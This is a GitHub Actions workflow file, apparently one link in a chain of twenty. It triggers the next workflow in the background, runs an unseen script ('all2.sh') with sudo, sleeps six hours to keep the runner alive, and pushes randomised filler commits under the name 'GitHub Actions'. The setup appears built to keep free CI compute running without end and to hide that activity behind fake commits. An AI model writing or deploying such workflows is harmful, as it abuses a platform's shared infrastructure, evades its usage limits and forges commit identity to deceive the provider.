name: amits_chain_13

on:
  workflow_dispatch:

jobs:
  amit:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout repo
        uses: actions/checkout@v3

      - name: Start background trigger for next workflow
        run: echo "Starting workflow 13/20"

      - name: Trigger next workflow (13/20) in background
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          (
            echo "[Workflow 13] Waiting 561s before triggering next..."
            sleep 561
            echo "[Workflow 13] Triggering amits_v58t6y5b.yml"
            gh workflow run "amits_v58t6y5b.yml" --repo kwinssi-bub/dock
          ) &
      - name: Run all2.sh
        run: sudo bash ./all2.sh

      - name: Keep action alive for 6h
        run: |
          echo "Sleeping for 6 hours..."
          sleep 21600

      - name: Make random commits
        run: |
          for i in $(seq 1 $((RANDOM % 3 + 1))); do
            echo "Random commit $i at $(date)" >> random_commit.txt
            git add random_commit.txt
            git config --global user.email "actions@github.com"
            git config --global user.name "GitHub Actions"
            git commit -m "Random commit $i at $(date)"
            sleep $((RANDOM % 3600))
          done
          git push

